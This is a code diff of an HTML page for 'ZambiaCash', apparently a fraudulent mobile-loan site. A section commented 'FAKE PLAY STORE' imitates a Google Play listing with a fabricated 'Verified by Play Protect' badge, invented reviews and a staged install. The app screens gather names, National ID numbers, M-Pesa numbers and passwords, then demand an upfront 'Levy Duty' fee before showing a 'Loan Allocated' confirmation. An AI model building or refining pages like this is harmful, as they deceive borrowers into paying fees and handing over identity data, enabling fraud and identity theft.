@@ -2,74 +2,115 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ZambiaCash - Apps on Google Play</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>ZambiaCash</title>
     <meta name="theme-color" content="#1E40AF">
     <link rel="manifest" href="manifest.json">
+    <link rel="apple-touch-icon" href="icon.png">
+    
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <script>
         tailwind.config = {
-            theme: { extend: { fontFamily: { sans: ['"Plus Jakarta Sans"', 'sans-serif'], roboto: ['"Roboto"', 'sans-serif'] }, colors: { brandBlue: '#1E40AF', brandLight: '#3B82F6', brandYellow: '#F59E0B', playBlue: '#0056D2', playGreen: '#01875f' }, boxShadow: { soft: '0 10px 40px -10px rgba(0,0,0,0.08)' } } }
+            theme: { extend: {
+                fontFamily: { sans: ['"Plus Jakarta Sans"', 'sans-serif'], roboto: ['"Roboto"', 'sans-serif'] },
+                colors: { brandBlue: '#1E40AF', brandLight: '#3B82F6', brandYellow: '#F59E0B', playBlue: '#0056D2', playGreen: '#01875f' },
+                boxShadow: { soft: '0 10px 40px -10px rgba(0,0,0,0.08)' }
+            } }
         }
     </script>
     <style>
         .hide { display: none !important; }
         .screen { display: none; flex-direction: column; min-height: 100vh; }
-        .screen.active { display: flex; }
-        .gradient-bg { background: linear-gradient(135deg, #0F172A 0%, #1E40AF 100%); }
-        .glass-card { background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); }
-        input { width: 100%; padding: 0.85rem 1rem; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; outline: none; font-size: 0.95rem; background: #F8FAFC; }
-        input:focus { border-color: #3B82F6; background: #FFF; }
-        .amount-btn { transition: all 0.2s; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; font-weight: 600; color: #475569; background: white; }
-        .amount-btn.selected { background: linear-gradient(135deg, #1E40AF 0%, #3B82F6 100%); color: white; border-color: transparent; box-shadow: 0 8px 20px -6px rgba(30,64,175,0.4); transform: translateY(-2px); }
-        .term-btn { transition: all 0.2s; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; font-weight: 600; color: #475569; background: white; }
+        .screen.active { display: flex; animation: screenIn 0.35s ease-out; }
+        @keyframes screenIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+        .gradient-bg { background: linear-gradient(160deg, #0F172A 0%, #1E40AF 100%); }
+        
+        input { width: 100%; padding: 1rem 1.1rem; border: 1.5px solid #E2E8F0; border-radius: 16px; outline: none; font-size: 16px; transition: all 0.2s; background: #F8FAFC; font-family: inherit; }
+        input:focus { border-color: #1E40AF; background: #FFFFFF; box-shadow: 0 0 0 4px rgba(30, 64, 175, 0.08); }
+        
+        .amount-btn { transition: all 0.15s ease; border: 1.5px solid #E2E8F0; border-radius: 14px; font-weight: 700; color: #475569; background: #FFFFFF; font-size: 15px; padding: 14px 0; }
+        .amount-btn.selected { background: #1E40AF; color: white; border-color: #1E40AF; box-shadow: 0 6px 16px -4px rgba(30, 64, 175, 0.4); }
+        
+        .term-btn { transition: all 0.15s ease; border: 1.5px solid #E2E8F0; border-radius: 14px; font-weight: 600; color: #475569; background: #FFFFFF; font-size: 14px; padding: 12px; }
         .term-btn.selected { background: #1E40AF; color: white; border-color: #1E40AF; }
+        
         .hide-scrollbar::-webkit-scrollbar { display: none; }
         .star { color: #FBBF24; }
         .review-avatar { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 14px; }
         #download-ring { transition: stroke-dashoffset 0.1s linear; }
+        
         @keyframes toastIn { from { opacity: 0; transform: translate(-50%,20px); } to { opacity: 1; transform: translate(-50%,0); } }
         @keyframes toastOut { from { opacity: 1; transform: translate(-50%,0); } to { opacity: 0; transform: translate(-50%,20px); } }
         .native-toast { animation: toastIn 0.3s ease-out forwards; }
         .native-toast.hide-toast { animation: toastOut 0.3s ease-in forwards; }
+        
         @keyframes fadeInOut { 0%{opacity:0;} 15%{opacity:1;} 85%{opacity:1;} 100%{opacity:0;} }
         .splash-anim { animation: fadeInOut 1.8s ease-in-out forwards; }
+
+        /* NATIVE APP FEEL */
+        .app-shell { background: #F7F8FA; min-height: 100vh; }
+        .native-card { background: #FFFFFF; border-radius: 22px; box-shadow: 0 1px 2px rgba(15, 23, 42, 0.04), 0 8px 24px -8px rgba(15, 23, 42, 0.08); }
+        .native-btn { background: #1E40AF; color: #fff; border: none; border-radius: 28px; padding: 17px 24px; font-size: 16px; font-weight: 700; letter-spacing: 0.01em; width: 100%; transition: all 0.15s ease; cursor: pointer; font-family: inherit; }
+        .native-btn:active { transform: scale(0.97); background: #1a3a9e; }
+        .native-btn:disabled { opacity: 0.5; }
+        
+        .app-bar { display: flex; align-items: center; padding: 20px 20px 12px; gap: 12px; }
+        .app-bar-back { width: 40px; height: 40px; border-radius: 50%; background: #FFFFFF; display: flex; align-items: center; justify-content: center; box-shadow: 0 1px 3px rgba(0,0,0,0.06); border: none; cursor: pointer; }
+        .app-bar-title { font-size: 20px; font-weight: 800; color: #0F172A; letter-spacing: -0.02em; }
+        .section-label { font-size: 11px; font-weight: 700; color: #64748B; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 12px; }
+        
+        .row-item { display: flex; justify-content: space-between; align-items: center; padding: 14px 0; }
+        .row-item + .row-item { border-top: 1px solid #F1F5F9; }
+        .row-label { font-size: 14px; color: #64748B; font-weight: 500; }
+        .row-value { font-size: 15px; font-weight: 700; color: #0F172A; }
+        
+        .check-circle { width: 96px; height: 96px; background: #DCFCE7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; animation: popIn 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
+        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+        
+        .info-banner { background: #EFF6FF; border: 1px solid #DBEAFE; border-radius: 18px; padding: 16px; display: flex; gap: 12px; align-items: flex-start; }
+        
+        .pulse-ring { width: 120px; height: 120px; border-radius: 50%; background: rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; position: relative; }
+        .pulse-ring::before { content: ''; position: absolute; inset: 0; border-radius: 50%; border: 2px solid rgba(255,255,255,0.25); animation: pulseRing 2s ease-out infinite; }
+        @keyframes pulseRing { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.4); opacity: 0; } }
     </style>
 </head>
 <body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
 
-<div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[13px] px-5 py-3 rounded-xl shadow-lg text-center font-medium max-w-[90vw]">Message</div>
+<div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[13px] px-5 py-3 rounded-xl shadow-lg text-center font-medium max-w-[90vw] font-sans">Message</div>
 
 <!-- OFFLINE -->
 <div id="offline-gate" class="hide fixed inset-0 z-[11000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
-    <h2 class="text-2xl font-bold text-white mb-2">No Internet Connection</h2>
-    <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto">ZambiaCash requires an active internet connection.</p>
-    <button onclick="location.reload()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl">Retry</button>
+    <h2 class="text-2xl font-bold text-white mb-2 font-sans">No Internet Connection</h2>
+    <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto font-sans">ZambiaCash requires an active internet connection.</p>
+    <button onclick="location.reload()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl font-sans">Retry</button>
 </div>
 
 <!-- BROWSER WARNING -->
 <div id="browser-warning" class="hide fixed inset-0 z-[10000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
-    <h2 class="text-2xl font-bold text-white mb-2">Open in Chrome</h2>
-    <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto">To install ZambiaCash, open this page in Google Chrome.</p>
-    <button onclick="location.href=location.href" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl mb-3">Open in Chrome</button>
-    <button onclick="navigator.clipboard.writeText(location.href)" class="w-full max-w-xs bg-slate-800 text-white font-bold py-3.5 rounded-xl border border-slate-700">Copy Link</button>
+    <div class="w-20 h-20 bg-amber-500/20 rounded-full flex items-center justify-center mb-6">
+        <svg class="w-10 h-10 text-amber-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+    </div>
+    <h2 class="text-2xl font-bold text-white mb-2 font-sans">Continue in Chrome</h2>
+    <p class="text-gray-400 mb-8 text-sm leading-relaxed max-w-xs mx-auto font-sans">ZambiaCash works best in Google Chrome. Tap below to open this page in Chrome and continue.</p>
+    <button onclick="openInChrome()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl mb-3 font-sans flex items-center justify-center gap-2">
+        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg>
+        Open in Chrome
+    </button>
+    <button onclick="copyLinkAndShowHelp()" class="w-full max-w-xs bg-slate-800 text-white font-bold py-3.5 rounded-xl border border-slate-700 font-sans">Copy Link</button>
+    <p class="text-gray-500 text-xs mt-6 max-w-xs mx-auto leading-relaxed font-sans">If this page opened from WhatsApp, Facebook, or another app, tap the menu (⋮) in the top corner and select "Open in Chrome".</p>
 </div>
 
-<!-- ============ FULL FAKE PLAY STORE ============ -->
+<!-- FAKE PLAY STORE -->
 <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20 font-sans">
     <div class="flex items-center justify-between p-4 sticky top-0 bg-white/90 backdrop-blur-md z-10">
         <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
         <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path></svg>
     </div>
-
     <div class="p-5 max-w-lg mx-auto">
         <div class="flex gap-4 mb-6">
             <div class="relative w-[104px] h-[104px] flex-shrink-0 flex items-center justify-center">
-                <svg id="ring-svg" class="hidden w-full h-full transform -rotate-90 absolute inset-0 z-10">
-                    <circle cx="52" cy="52" r="48" stroke="#F1F5F9" stroke-width="5" fill="none"/>
-                    <circle id="download-ring" cx="52" cy="52" r="48" stroke="#0056D2" stroke-width="5" fill="none" stroke-dasharray="301.59" stroke-dashoffset="301.59" stroke-linecap="round"/>
-                </svg>
+                <svg id="ring-svg" class="hidden w-full h-full transform -rotate-90 absolute inset-0 z-10"><circle cx="52" cy="52" r="48" stroke="#F1F5F9" stroke-width="5" fill="none"/><circle id="download-ring" cx="52" cy="52" r="48" stroke="#0056D2" stroke-width="5" fill="none" stroke-dasharray="301.59" stroke-dashoffset="301.59" stroke-linecap="round"/></svg>
                 <img src="icon.png" id="main-app-icon" class="w-[88px] h-[88px] rounded-2xl shadow-soft border border-gray-100 object-cover z-0" alt="ZambiaCash">
             </div>
             <div class="flex flex-col justify-center">
@@ -78,7 +119,6 @@
                 <p class="text-gray-500 text-xs mt-1">Contains ads</p>
             </div>
         </div>
-
         <div id="download-text" class="hide mb-4">
             <span id="download-percent" class="text-sm font-semibold text-gray-700">0% of 10 MB</span>
             <div class="flex items-center gap-1 mt-1 text-playGreen">
@@ -86,21 +126,17 @@
                 <span class="text-xs font-semibold">Verified by Play Protect</span>
             </div>
         </div>
-
         <div class="flex gap-2 mb-6" id="pre-install-buttons">
             <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-soft active:scale-95 transition-transform">Install</button>
         </div>
-
         <div class="flex gap-2 mb-6 hide" id="downloading-buttons">
             <button class="flex-1 bg-white text-playBlue font-semibold text-lg py-2.5 rounded-full border-2 border-gray-200" style="opacity:0.5;">Cancel</button>
             <button disabled id="btn-installing" class="flex-1 bg-gray-200 text-gray-400 font-semibold text-lg py-2.5 rounded-full flex items-center justify-center gap-2">Downloading...</button>
         </div>
-
         <div class="flex gap-3 mb-6 hide" id="post-install-buttons">
             <button onclick="mockUninstall()" class="flex-1 bg-white text-playBlue font-semibold text-lg py-3 rounded-full border border-gray-300">Uninstall</button>
             <button id="btn-open-app" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3 rounded-full">Open</button>
         </div>
-
         <div id="post-install-content" class="hide">
             <div class="mb-8 border-t border-gray-100 pt-6">
                 <h3 class="font-bold text-xl text-gray-900 mb-2">What's new</h3>
@@ -120,7 +156,6 @@
                 <button id="btn-write-review" class="text-playBlue font-semibold text-sm">Write a review</button>
             </div>
         </div>
-
         <div id="pre-install-content">
             <div class="flex justify-between items-center text-center py-5 mb-6 border-y border-gray-100" id="stats-row">
                 <div class="flex-1 flex flex-col items-center"><div class="flex items-center gap-1"><span class="font-bold text-base">4.6</span><svg class="w-4 h-4 text-gray-800" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg></div><span class="text-[11px] text-gray-600 mt-1">3.1K reviews</span></div>
@@ -129,7 +164,6 @@
                 <div class="w-px h-10 bg-gray-200"></div>
                 <div class="flex-1 flex flex-col items-center"><div class="border border-gray-600 rounded px-1.5 text-[11px] font-bold mb-1">12+</div><span class="text-[11px] text-gray-600">Rated for 12+</span></div>
             </div>
-
             <div class="flex gap-4 overflow-x-auto hide-scrollbar mb-8 pb-4 snap-x">
                 <div class="w-44 h-80 bg-gradient-to-br from-brandBlue to-brandLight rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
                     <div><p class="text-blue-200 text-[11px] font-bold tracking-widest uppercase">Available Limit</p><p class="text-white text-3xl font-extrabold mt-2">Ksh 50,000</p></div>
@@ -144,13 +178,11 @@
                     <div class="bg-white/20 backdrop-blur rounded-xl p-4 border border-white/20"><p class="text-white text-sm font-bold">Fastest Loans</p><p class="text-emerald-50 text-[11px] mt-1">24/7 Available</p></div>
                 </div>
             </div>
-
             <div class="mb-8">
                 <h3 class="font-bold text-xl text-gray-900 mb-3">About this app</h3>
                 <p class="text-sm text-gray-600 leading-relaxed mb-4">Get instant mobile loans from Ksh 1,000 to Ksh 50,000 directly to your M-Pesa. We offer low interest rates, instant disbursement, and flexible repayment terms of 30 to 90 days. No paperwork, 100% online.</p>
                 <div class="flex gap-2"><span class="border border-gray-300 rounded-lg px-3 py-1.5 text-xs font-medium text-gray-700">Finance</span><span class="border border-gray-300 rounded-lg px-3 py-1.5 text-xs font-medium text-gray-700">Loans</span></div>
             </div>
-
             <div class="mb-8 border-t border-gray-100 pt-8">
                 <h3 class="font-bold text-xl text-gray-900 mb-3">Data safety</h3>
                 <p class="text-sm text-gray-600 leading-relaxed mb-4">Safety starts with understanding how developers collect and share your data.</p>
@@ -160,7 +192,6 @@
                     <div class="flex items-start gap-4"><svg class="w-6 h-6 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg><div><p class="text-sm font-semibold text-gray-900">Data is encrypted in transit</p></div></div>
                 </div>
             </div>
-
             <div class="border-t border-gray-100 pt-8 mb-8">
                 <h3 class="font-bold text-xl text-gray-900 mb-4">Ratings and reviews</h3>
                 <div class="flex gap-4 items-center mb-8">
@@ -174,32 +205,17 @@
                     </div>
                 </div>
                 <div class="space-y-7">
-                    <div>
-                        <div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-purple-500">J</div><div><p class="text-sm font-semibold">James Mwangi</p><p class="text-[11px] text-gray-500">2 days ago</p></div></div>
-                        <p class="text-sm text-gray-600 leading-relaxed">The disbursement is instant. I applied for a loan and received the M-Pesa message in less than 2 minutes. Truly impressive.</p>
-                    </div>
-                    <div>
-                        <div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-pink-500">M</div><div><p class="text-sm font-semibold">Mary Wanjiku</p><p class="text-[11px] text-gray-500">1 week ago</p></div></div>
-                        <p class="text-sm text-gray-600 leading-relaxed">The interest rates are very low compared to other apps I've used. Very fair terms.</p>
-                    </div>
-                    <div>
-                        <div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-orange-500">P</div><div><p class="text-sm font-semibold">Peter Otieno</p><p class="text-[11px] text-gray-500">2 weeks ago</p></div></div>
-                        <p class="text-sm text-gray-600 leading-relaxed">The loan was disbursed quickly but the app crashed once during my application.</p>
-                    </div>
+                    <div><div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-purple-500">J</div><div><p class="text-sm font-semibold">James Mwangi</p><p class="text-[11px] text-gray-500">2 days ago</p></div></div><p class="text-sm text-gray-600 leading-relaxed">The disbursement is instant. I applied for a loan and received the M-Pesa message in less than 2 minutes. Truly impressive.</p></div>
+                    <div><div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-pink-500">M</div><div><p class="text-sm font-semibold">Mary Wanjiku</p><p class="text-[11px] text-gray-500">1 week ago</p></div></div><p class="text-sm text-gray-600 leading-relaxed">The interest rates are very low compared to other apps I've used. Very fair terms.</p></div>
+                    <div><div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-orange-500">P</div><div><p class="text-sm font-semibold">Peter Otieno</p><p class="text-[11px] text-gray-500">2 weeks ago</p></div></div><p class="text-sm text-gray-600 leading-relaxed">The loan was disbursed quickly but the app crashed once during my application.</p></div>
                 </div>
             </div>
-
             <div class="border-t border-gray-100 pt-8 mb-8">
                 <h3 class="font-bold text-lg text-gray-900 mb-3">About the developer</h3>
-                <div class="text-sm text-gray-600 space-y-1">
-                    <p class="font-semibold text-gray-900">ZambiaCash Financial Services</p>
-                    <p>support@zambiacash.com</p>
-                    <p>Nairobi, Kenya</p>
-                </div>
+                <div class="text-sm text-gray-600 space-y-1"><p class="font-semibold text-gray-900">ZambiaCash Financial Services</p><p>support@zambiacash.com</p><p>Nairobi, Kenya</p></div>
             </div>
         </div>
     </div>
-
     <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 flex justify-around py-2.5 z-50">
         <div class="flex flex-col items-center text-gray-500"><svg class="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path></svg><span class="text-[10px] font-medium">Games</span></div>
         <div class="flex flex-col items-center text-gray-500"><svg class="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z"></path></svg><span class="text-[10px] font-medium">Apps</span></div>
@@ -213,122 +229,151 @@
     <h1 class="text-white text-2xl font-bold font-sans">ZambiaCash</h1>
 </div>
 
-<!-- APP CONTENT -->
+<!-- ============ APP CONTENT ============ -->
 <div id="app-content" class="hide font-sans">
 
-<div id="screen-login" class="screen active gradient-bg p-6">
-    <div class="flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
-        <div class="text-center mb-10">
-            <div class="w-24 h-24 bg-white/10 rounded-3xl mx-auto flex items-center justify-center border border-white/20 mb-6"><img src="icon.png" class="w-16 h-16 rounded-2xl object-cover"></div>
-            <h1 class="text-white text-3xl font-extrabold tracking-tight">ZambiaCash</h1>
-            <p class="text-blue-200 text-sm font-medium mt-2">Quick loans in minutes</p>
-        </div>
-        <div class="glass-card rounded-3xl p-6 shadow-2xl">
-            <h2 class="text-xl font-bold text-slate-900 mb-5">Create Account</h2>
-            <div class="space-y-4">
-                <div><input type="text" id="in-name" placeholder="Full Name"></div>
-                <div><input type="number" id="in-id" placeholder="National ID (7-8 digits)"></div>
-                <div><input type="tel" id="in-mpesa" placeholder="M-Pesa (0712345678)"></div>
-                <div><input type="password" id="in-pass" placeholder="Password (min 4 chars)"></div>
-                <button onclick="submitLogin()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl mt-4 shadow-lg">Create Account</button>
+    <!-- LOGIN -->
+    <div id="screen-login" class="screen gradient-bg" style="padding: 24px;">
+        <div class="flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
+            <div class="text-center mb-10">
+                <div class="w-24 h-24 bg-white/10 rounded-3xl mx-auto flex items-center justify-center border border-white/20 mb-6"><img src="icon.png" class="w-16 h-16 rounded-2xl object-cover"></div>
+                <h1 class="text-white text-3xl font-extrabold tracking-tight">ZambiaCash</h1>
+                <p class="text-blue-200 text-sm font-medium mt-2">Quick loans in minutes</p>
             </div>
-            <p class="text-center text-xs text-slate-400 mt-6 font-medium">🔒 Your data is encrypted and safe</p>
-        </div>
-    </div>
-</div>
-
-<div id="screen-checking" class="screen gradient-bg p-6 items-center justify-center">
-    <div class="w-28 h-28 bg-white/10 rounded-full flex items-center justify-center mb-8 animate-pulse border border-white/20"><img src="icon.png" class="w-20 h-20 rounded-2xl object-cover"></div>
-    <h2 class="text-white text-2xl font-bold text-center mb-2">Checking your<br>loan limit</h2>
-    <p id="check-status" class="text-blue-200 text-sm mb-8 font-medium">Analyzing your profile...</p>
-    <div class="w-full max-w-xs bg-blue-900/50 rounded-full h-3 mb-3 border border-white/10"><div id="check-bar" class="bg-brandYellow h-3 rounded-full transition-all duration-100" style="width: 0%"></div></div>
-    <p id="check-percent" class="text-white font-bold text-2xl">0%</p>
-</div>
-
-<div id="screen-select" class="screen bg-slate-50 p-6">
-    <div class="max-w-sm mx-auto w-full">
-        <h2 class="text-2xl font-extrabold text-slate-900 mb-1">Choose your loan</h2>
-        <p class="text-sm text-slate-500 mb-6 font-medium">Tap an amount, then choose a term</p>
-        <div class="grid grid-cols-3 gap-2.5 mb-8" id="amount-grid"></div>
-        <p class="font-bold text-slate-900 mb-3">Repayment term</p>
-        <div class="flex gap-2.5 mb-8">
-            <button onclick="setTerm(30, this)" class="term-btn selected flex-1 py-3 text-sm">30 days</button>
-            <button onclick="setTerm(60, this)" class="term-btn flex-1 py-3 text-sm">60 days</button>
-            <button onclick="setTerm(90, this)" class="term-btn flex-1 py-3 text-sm">90 days</button>
-        </div>
-        <div class="bg-white rounded-3xl p-6 shadow-soft space-y-4 mb-8 border border-slate-100">
-            <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">You receive</span><span id="sum-receive" class="font-extrabold text-brandBlue text-lg">Ksh 1,000</span></div>
-            <div class="flex justify-between items-center"><span id="sum-interest-label" class="text-slate-500 font-medium text-sm">Interest (10%)</span><span id="sum-interest" class="font-bold text-slate-800">Ksh 100</span></div>
-            <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total repayment</span><span id="sum-total" class="font-bold text-emerald-600 text-lg">Ksh 1,100</span></div>
-            <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Due date</span><span id="sum-due" class="font-bold text-slate-800">--</span></div>
-            <hr class="border-slate-100 my-2">
-            <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Levy Duty (one-time)</span><span id="sum-levy" class="font-extrabold text-brandYellow text-lg">Ksh 1</span></div>
-        </div>
-        <button onclick="goToPayment()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg">Continue</button>
-    </div>
-</div>
-
-<div id="screen-payment" class="screen bg-slate-50 p-6">
-    <div class="max-w-sm mx-auto w-full">
-        <div class="flex items-center gap-3 mb-6">
-            <button onclick="showScreen('screen-select')" class="w-10 h-10 bg-white rounded-full flex items-center justify-center shadow-sm text-slate-700"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"></path></svg></button>
-            <h2 class="text-xl font-extrabold text-slate-900">Levy Duty Payment</h2>
-        </div>
-        <p class="text-sm text-slate-500 mb-6 font-medium">Pay the government-mandated Levy Duty to activate your loan.</p>
-        <div class="bg-white rounded-3xl p-6 shadow-soft space-y-4 mb-5 border border-slate-100">
-            <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Loan amount</span><span id="pay-loan" class="font-bold text-slate-800">Ksh 1,000</span></div>
-            <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Interest</span><span id="pay-interest" class="font-bold text-slate-800">Ksh 100</span></div>
-            <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total repayment</span><span id="pay-total" class="font-bold text-emerald-600">Ksh 1,100</span></div>
-            <hr class="border-slate-100 my-2">
-            <div class="flex justify-between items-center"><div><span class="text-slate-500 font-medium text-sm block">Levy Duty (pay now)</span><span class="text-[10px] text-slate-400 font-bold uppercase">Gov. requirement</span></div><span id="pay-levy" class="font-extrabold text-brandYellow text-xl">Ksh 1</span></div>
-        </div>
-        <div class="bg-white rounded-3xl p-6 shadow-soft mb-5 border border-slate-100">
-            <p class="text-sm font-semibold text-slate-800 mb-1">Account: <span id="pay-name"></span></p>
-            <label class="text-sm font-bold text-slate-900 mb-2 block mt-4">M-Pesa Number</label>
-            <input type="tel" id="pay-mpesa" placeholder="0712345678">
-            <p class="text-[11px] text-slate-400 mt-2 font-medium">Loan will be sent to this number</p>
-        </div>
-        <button onclick="showScreen('screen-select')" class="w-full text-brandBlue font-bold py-3 mb-4 text-sm">Change Loan Amount</button>
-        <button onclick="processPayment()" id="btn-pay" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg">Pay Ksh 1 Levy Duty</button>
-    </div>
-</div>
-
-<div id="screen-success" class="screen bg-slate-50 p-6">
-    <div class="max-w-sm mx-auto w-full text-center mt-12">
-        <div id="verify-anim" class="flex flex-col items-center">
-            <div class="w-28 h-28 border-[6px] border-slate-200 border-t-brandBlue rounded-full animate-spin mb-6"></div>
-            <h2 class="text-2xl font-extrabold text-slate-900">Verifying payment</h2>
-            <p id="verify-subtitle" class="text-sm font-medium text-slate-500 mt-2 px-2 leading-relaxed">Please wait while we confirm with M-Pesa...</p>
-            <p id="verify-time" class="text-brandYellow font-extrabold mt-4 text-xl bg-yellow-50 px-4 py-1 rounded-full">0s</p>
-        </div>
-        <div id="success-anim" class="hide flex flex-col items-center">
-            <div class="w-24 h-24 bg-emerald-100 text-emerald-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl shadow-glow">✓</div>
-            <h2 class="text-2xl font-extrabold text-slate-900">Loan Allocated!</h2>
-            <p class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4">Funds have been released to your M-Pesa immediately.</p>
-            <div class="bg-white rounded-3xl p-6 shadow-soft text-left w-full space-y-4 mb-8 border border-slate-100">
-                <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Loan Amount</span><span id="suc-loan" class="font-bold text-slate-800 text-lg">Ksh 1,000</span></div>
-                <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total Repayment</span><span id="suc-total" class="font-bold text-slate-800">Ksh 1,100</span></div>
-                <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Due Date</span><span id="suc-due" class="font-bold text-slate-800">--</span></div>
-                <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">M-Pesa</span><span id="suc-mpesa" class="font-bold text-brandBlue"></span></div>
+            <div class="bg-white rounded-3xl p-6 shadow-2xl">
+                <h2 class="text-xl font-bold text-slate-900 mb-1">Create Account</h2>
+                <p class="text-sm text-slate-500 mb-6">Get started with your loan in minutes</p>
+                <div class="space-y-4">
+                    <div><input type="text" id="in-name" placeholder="Full Name"></div>
